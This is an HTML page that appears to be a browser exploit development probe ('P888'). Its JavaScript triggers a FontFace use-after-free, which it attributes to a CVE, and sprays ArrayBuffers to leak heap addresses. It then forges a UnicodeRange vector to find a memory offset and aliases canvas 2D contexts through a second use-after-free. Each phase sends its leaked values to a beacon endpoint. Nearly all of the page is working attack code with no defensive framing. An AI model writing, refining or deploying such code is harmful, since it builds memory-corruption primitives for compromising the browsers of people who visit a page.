<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P888: Range Filter Oracle & Canvas State Investigation</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P888...</div>
<h2>P888: Range Filter Oracle & Canvas State Reallocation</h2>
<pre id="log">Initializing diagnostic probe P888...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P888-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

function hex64(dv, off) {
  var lo = dv.getUint32(off, true);
  var hi = dv.getUint32(off + 4, true);
  return '0x' + hi.toString(16) + ('00000000' + lo.toString(16)).slice(-8);
}

log('[*] Probe P888 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: FontFace UAF (CVE-2026-43715) â€” Setup & Extraction
 * ============================================================ */
var st = document.createElement('style');
st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);

var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
document.fonts.add(face);
void face.loaded;

var fabs = [], ffired = false;
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffired) return undefined;
    ffired = true;
    if (st) { st.remove(); st.textContent = ''; st = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;
    fabs = [];
    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
    try { document.fonts.check('1em bb1'); } catch(e) {}
    document.body.offsetHeight;
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em f1, bb1', 'AB');

setTimeout(function() {
  delete FontFace.prototype.then;
  var bestI = -1, bestNz = 0;
  for (var i = 0; i < fabs.length; i++) {
    var u = new Uint8Array(fabs[i]), nz = 0;
    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
    if (nz > bestNz) { bestNz = nz; bestI = i; }
  }

  var Hstr = 'unknown', q13str = 'unknown';
  var H_hi = 0, H_lo = 0;
  var fontDV = null;

  if (bestI >= 0 && bestNz >= 4) {
    fontDV = new DataView(fabs[bestI]);
    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
    if (q11hi !== 0) {
      var borrow = (q11lo < 0x68) ? 1 : 0;
      H_hi = q11hi - borrow;
      H_lo = (q11lo - 0x68) >>> 0;
      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
    }
    if (q13hi !== 0) {
      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
    }
  }

  log('[+] Phase 1: Live Heap H = ' + Hstr + ' | q13 = ' + q13str + ' (Slot #' + bestI + ')', 'ok');
  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|slot=' + bestI);

  /* ============================================================
   * PHASE 2: Controlled Target Buffer & UnicodeRange Setup
   * ============================================================ */
  var targetSlot = (bestI < 63) ? (bestI + 1) : (bestI - 1);
  var targetDV = new DataView(fabs[targetSlot]);

  var slotDelta = targetSlot - bestI;
  var byteDelta = slotDelta * 0xC0;
  var predLo = (H_lo + byteDelta) >>> 0;
  var predHi = H_hi;

  // In target buffer, forge a UnicodeRange table:
  // Range 0: [0x0042, 0x0042] ('B' only)
  // Range 1: [0x0044, 0x0044] ('D' only)
  targetDV.setUint32(0x00, 0x0042, true); // from = 'B'
  targetDV.setUint32(0x04, 0x0042, true); // to   = 'B'
  targetDV.setUint32(0x08, 0x0044, true); // from = 'D'
  targetDV.setUint32(0x0C, 0x0044, true); // to   = 'D'

  log('[+] Phase 2: Target Slab forged at 0x' + predHi.toString(16) + predLo.toString(16) + ' (Slot #' + targetSlot + ')', 'hot');

  /* ============================================================
   * PHASE 3: Range Filter Vector Offset Identification
   * ============================================================ */
  var candOffsets = [0x18, 0x20, 0x28, 0x30, 0x38];
  var hitOffset = -1;
  var scanResults = [];

  for (var k = 0; k < candOffsets.length; k++) {
    var off = candOffsets[k];

    // Backup original 16 bytes
    var origBufLo = fontDV.getUint32(off, true);
    var origBufHi = fontDV.getUint32(off + 4, true);
    var origCap   = fontDV.getUint32(off + 8, true);
    var origSz    = fontDV.getUint32(off + 12, true);

    // Overwrite Vector<UnicodeRange>: point to predAddr, cap=1, sz=1
    fontDV.setUint32(off, predLo, true);
    fontDV.setUint32(off + 4, predHi, true);
    fontDV.setUint32(off + 8, 1, true);  // capacity = 1
    fontDV.setUint32(off + 12, 1, true); // size = 1

    var chkB = false, chkA = false;
    try {
      chkB = document.fonts.check('1em bb1', 'B');
      chkA = document.fonts.check('1em bb1', 'A');
    } catch(e) {}

    // Restore original words
    fontDV.setUint32(off, origBufLo, true);
    fontDV.setUint32(off + 4, origBufHi, true);
    fontDV.setUint32(off + 8, origCap, true);
    fontDV.setUint32(off + 12, origSz, true);

    scanResults.push('0x' + off.toString(16) + ':B=' + chkB + ',A=' + chkA);

    if (chkB === true && chkA === false) {
      hitOffset = off;
      break;
    }
  }

  log('[+] Phase 3: Range Scan: ' + scanResults.join(' | ') + ' (Hit=0x' + (hitOffset >= 0 ? hitOffset.toString(16) : 'none') + ')', hitOffset >= 0 ? 'hot' : 'info');
  syncBn('RANGE-ORACLE', 'hit=0x' + (hitOffset >= 0 ? hitOffset.toString(16) : 'none') + '|results=' + scanResults.join(';'));

  /* ============================================================
   * PHASE 4: Canvas UAF & lineDash Vector Investigation
   * ============================================================ */
  var innerCtx1 = null, innerCtx2 = null;

  var c1 = document.createElement('canvas');
  c1.width = 32; c1.height = 32;
  var opts1 = {};
  Object.defineProperty(opts1, 'alpha', {
    get: function() {
      innerCtx1 = c1.getContext('2d');
      return true;
    }
  });
  c1.getContext('bitmaprenderer', opts1);

  var c2 = document.createElement('canvas');
  c2.width = 32; c2.height = 32;
  var opts2 = {};
  Object.defineProperty(opts2, 'alpha', {
    get: function() {
      innerCtx2 = c2.getContext('2d');
      return true;
    }
  });
  c2.getContext('bitmaprenderer', opts2);

  var sprayCtxs = [];
  for (var s = 0; s < 200; s++) {
    var c = document.createElement('canvas');
    c.width = 32; c.height = 32;
    var ctx = c.getContext('2d');
    ctx.lineWidth = 1000.0 + s;
    sprayCtxs.push(ctx);
  }

  var idx1 = -1, idx2 = -1;
  try {
    var lw1 = innerCtx1.lineWidth;
    if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
    var lw2 = innerCtx2.lineWidth;
    if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
  } catch(e) {}

  var dashVerified = false, dashLen = -1, dashV0 = -1;
  if (idx1 >= 0 && sprayCtxs[idx1]) {
    try {
      innerCtx1.setLineDash([12.5, 24.5, 36.5, 48.5]);
      var dArr = sprayCtxs[idx1].getLineDash();
      dashLen = dArr.length;
      dashV0 = dArr[0];
      dashVerified = (dashLen === 4 && dashV0 === 12.5);

      // Test save() allocation
      innerCtx1.save();
    } catch(e) {
      dashVerified = false;
    }
  }

  log('[+] Phase 4: Dual Canvas: Ctx1=#' + idx1 + ', Ctx2=#' + idx2 + ' | dashVerified=' + dashVerified + ' (len=' + dashLen + ')', 'ok');
  syncBn('LINEDASH', 'idx1=' + idx1 + '|idx2=' + idx2 + '|dashOk=' + dashVerified + '|len=' + dashLen + '|v0=' + dashV0);

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P888 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P888 Execution Completed Cleanly', 'hot');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
  log('    - Range Oracle: Hit=0x' + (hitOffset >= 0 ? hitOffset.toString(16) : 'none') + ' (' + scanResults.join('; ') + ')', hitOffset >= 0 ? 'hot' : 'info');
  log('    - LineDash Alias: ' + dashVerified + ' (idx1=' + idx1 + ', idx2=' + idx2 + ')', 'ok');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|rangeHit=0x' + (hitOffset >= 0 ? hitOffset.toString(16) : 'none') + '|dashOk=' + dashVerified + '|idx1=' + idx1 + '|idx2=' + idx2);

}, 400);
</script>
</body>
</html>
